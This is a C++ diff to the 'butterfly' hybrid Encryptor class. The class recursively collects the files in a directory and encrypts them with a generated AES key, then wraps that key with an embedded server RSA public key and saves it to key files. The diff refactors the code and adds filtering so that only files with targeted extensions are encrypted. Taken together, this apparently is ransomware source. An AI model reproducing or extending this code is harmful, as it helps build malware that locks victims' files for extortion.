@@ -7,11 +7,10 @@ namespace butterfly
 namespace hybrid
 {
 
-Encryptor::Encryptor(int keySize, const std::string &aesKeyDbFilepath) : _keySize(keySize), _aesKeyInit(false), _aesKeyDbFilepath(aesKeyDbFilepath),
-                                                                         _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
-                                                                         _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
-                                                                         _aesEncryptor(new aes::AESEncryptor()),
-                                                                         _dirIterator(new DirectoryIterator())
+Encryptor::Encryptor(int keySize, const std::string &aesKeyDBPath) : _keySize(keySize), _aesKeyInit(false), _aesKeyDBPath(aesKeyDBPath),
+                                                                     _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
+                                                                     _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
+                                                                     _aesEncryptor(new aes::AESEncryptor())
 {
     LOG_TRACE("Create class Encryptor");
 }
@@ -19,7 +18,8 @@ Encryptor::Encryptor(int keySize, const std::string &aesKeyDbFilepath) : _keySiz
 void Encryptor::validateAESKeyLength()
 {
     std::string aeskey, aesiv, aeskeypair;
-    do {
+    do
+    {
 
         if ( _aesKeyInit )
         {
@@ -33,7 +33,8 @@ void Encryptor::validateAESKeyLength()
         LOG_TRACE("Generated AESKey: " << aeskey << " with Length: " << aeskey.length() << " and AESIV: " <<  aesiv << " with Length: " << aesiv.length() << " and AESKeyPairLength: " << aeskeypair.length());
         _aesKeyInit = true;
 
-    } while ( (aeskey.length() < 32) or (aesiv.length() < 16));
+    }
+    while ( (aeskey.length() < 32) or (aesiv.length() < 16));
 
 }
 
@@ -43,7 +44,7 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     encryptCPrivateRSA();
 
     // Get all files from provided directory path
-    auto files =  _dirIterator->getAllFiles(dirPath);
+    auto files =  DirectoryIterator::getAllFiles(dirPath);
 
     // Generate and validate the AES Key and IV
     validateAESKeyLength();
@@ -57,10 +58,15 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
         butterfly::writeBinFile("AESKey_protected.txt", aeskeypair.c_str(), static_cast<long>(aeskeypair.length()));
     }
 
+    // Iterate over all file paths
     for (auto &file: files)
     {
-        LOG_TRACE("FILE: " << file);
-        encryptFileWithAES(file.string());
+        // Check if the provided file extension is part of the fileExtensionVector
+        if ( std::find(butterfly::fileExtensionVec.begin(), butterfly::fileExtensionVec.end(), DirectoryIterator::getFileExtension(file)) != butterfly::fileExtensionVec.end() )
+        {
+            encryptFileWithAES(file.string());
+        }
+
     }
 
     // Save the final AESKey.bin file
